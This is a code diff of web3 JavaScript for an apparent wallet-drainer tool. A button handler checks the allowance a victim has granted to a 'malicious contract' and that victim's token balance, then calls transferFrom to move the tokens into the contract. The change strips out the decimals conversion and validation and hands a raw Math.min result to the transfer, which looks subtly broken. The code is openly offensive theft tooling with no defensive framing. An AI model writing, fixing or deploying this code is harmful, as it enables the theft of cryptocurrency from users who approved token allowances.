@@ -468,35 +468,22 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
 
         try {
-            // Dynamically retrieve the token decimals from the contract
-            const decimals = await tokenContract.methods.decimals().call();
-
-            // If you need to hard-code decimals in the future, you can set it manually like this:
-            // const decimals = 18;
-
-            // Check if the victim has approved the malicious contract to spend tokens
+            // Get the allowance that the victim has given to the malicious contract
             const allowance = await tokenContract.methods.allowance(cleanedVictimAddress, maliciousContractAddress).call();
+
+            // Get the victim's token balance
             const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
-            
-            // Calculate the amount to withdraw (minimum of allowance or balance)
-            const amountToWithdraw = Math.min(parseFloat(allowance), parseFloat(balance));
+
+            // Calculate the amount to withdraw, which is the minimum of the balance and allowance
+            const amountToWithdraw = Math.min(balance, allowance);
 
             if (amountToWithdraw <= 0) {
                 alert("Insufficient allowance or balance to withdraw.");
                 return;
             }
 
-            // Convert the amount to the token's smallest unit using BigNumber
-            const amountInTokens = web3.utils.toBN(amountToWithdraw).mul(web3.utils.toBN(Math.pow(10, decimals))).toString();
-
-            // Check if the conversion succeeded and the amount is valid
-            if (!amountInTokens || isNaN(amountInTokens)) {
-                alert("Invalid token amount format.");
-                return;
-            }
-
-            // Perform the withdrawal from the victim's wallet to the malicious contract
-            const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountInTokens).send({ from: accounts[0] });
+            // Now, safely withdraw the tokens (amountToWithdraw should already be in the correct format for transfer)
+            const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw).send({ from: accounts[0] });
 
             alert(`Successfully withdrawn ${amountToWithdraw} tokens from the victim's account to the malicious contract!`);
         } catch (error) {
@@ -506,6 +493,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
+
 
 
 
